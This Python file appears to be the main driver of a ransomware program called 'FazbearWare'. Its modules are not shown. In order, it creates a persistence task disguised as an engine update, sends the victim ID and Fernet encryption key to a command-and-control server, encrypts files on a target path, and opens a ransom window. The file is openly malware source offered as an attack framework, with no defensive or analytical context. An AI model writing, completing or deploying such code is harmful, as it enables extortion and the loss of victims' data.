
import persistence
import victim_ID
import encrypt
import ransom_window_UI

def run_fazbearware():
    print("""
    [!] FazbearWare Framework Loading...
    """)

    # 1. ESTABLISH PERSISTENCE
    print("[*] Configuring system persistence...")
    try:
        persistence.task("FazbearEngine_Update")
        print("[+] Persistence task created successfully.")
    except Exception as e:
        print(f"[-] Skip persistence: {e}")

    # 2. C2 REGISTRATION
    print("[*] Connecting to C2 Server...")
    try:
        victim_ID.send_to_c2()
        print("[+] Victim ID and Fernet Key synced with database.")
    except Exception as e:
        print(f"[!] C2 Connection failed: {e}. Proceeding with offline encryption.")

    # 3. EXECUTE ENCRYPTION
    print("[*] Initiating encryption process...")
    try:
        encrypt.encrypt_path()
        print("[+] Encryption cycle complete.")
    except Exception as e:
        print(f"[X] Critical error during encryption: {e}")

    # 4. DEPLOY RANSOM UI
    print("[!] Deployment finished. Launching UI...")
    ransom_window_UI.window.mainloop()

if __name__ == "__main__":
    run_fazbearware()

